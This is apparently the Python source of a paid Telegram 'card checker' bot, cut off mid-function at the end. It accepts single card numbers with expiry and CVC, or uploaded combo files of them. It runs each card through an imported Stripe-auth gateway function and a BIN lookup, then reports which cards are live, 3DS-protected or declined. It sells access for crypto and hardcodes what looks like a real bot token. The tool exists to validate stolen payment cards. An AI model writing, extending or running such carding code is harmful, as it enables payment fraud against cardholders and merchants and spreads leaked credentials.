import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup
stopuser = {}

token = '7500695376:AAE67UrkRlrwYuID4gqBt6Xz9lpTTjVQWpc'

bot=telebot.TeleBot(token,parse_mode="HTML")
admin=6440962840 #id ta
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}	
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="http://t.me/Barry_op")
			keyboard.add(contact_button)
			random_number = random.randint(2, 37)
			photo_url = f'https://t.me/Barry_op/{random_number}'
			bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		username = message.from_user.first_name
		random_number = random.randint(2, 37)
		photo_url = f'https://t.me/Barry_op{random_number}'
		bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.reply_to(message, text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
			keyboard.add(contact_button)
			bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
			keyboard.add(contact_button)
			bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"️🏴‍☠️ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 🏴‍☠️",callback_data='stppp')
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)



@bot.callback_query_handler(func=lambda call: call.data == 'stppp')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝐠➜ @Barry_op')
						return
					try:
						data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country_flag'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country_name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['brand'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						level=(data['level'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(br(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 3DSCUR 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Barry_op''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
					if "Thank You" in last or 'Invalid postal' in last or 'Payment method successfully added' in last or 'Nice! New payment method added' in last or 'success' in last or 'Approved' in last or 'Thank you' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'requires_action' in last:
						risk+=1
					elif 'Insufficient Funds' in last:
						mmsg=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
						bot.send_message(call.from_user.id, mmsg)
						ccnn+=1
					else:
						dd += 1
					time.sleep(4)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @Barry_op')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	
	
	
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 '
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(br(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	try:
		level = data['level']
	except:
		level = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	mmsg=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	mscur=f'''<b>3D ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	if "Payment method successfully added" in last or 'Invalid postal' in last or 'Thank you' in last or 'Nice! New payment method added' in last or 'success' in last or 'Approved' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif 'Insufficient Funds' in last:
	    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=mmsg)
	elif 'requires_action' in last:
	    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=mscur)
	    
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
		


@bot.message_handler(func=lambda message: message.text.lower().startswith('.bin') or message.text.lower().startswith('/bin'))
def respond_to_vbv(message):
	cc = message.text
	
	ccc = cc[:11]
	cccc = ccc.split('/bin ')[1]
	
	data = requests.get('https://bins.antipublic.cc/bins/'+cccc).json()
	#except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	try:
		level = data['level']
	except:
		level = 'Unknown'
		
	msg=f'''<b>𝗩𝗮𝗹𝗶𝗱 𝗕𝗜𝗡 ✅
	
𝗕𝗜𝗡 -» <code>{cccc}</code>
	
𝗕𝗶𝗻 𝗶𝗻𝗳𝗼 -» {brand} - {card_type} - {level}
𝗕𝗮𝗻𝗸 -» {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country} {country_flag}
</b>'''
	
	bot.reply_to(message,msg,parse_mode="HTML")
	


@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>BARRY OP 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
𝗣𝗟𝗔𝗡 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='BARRY-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
   
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
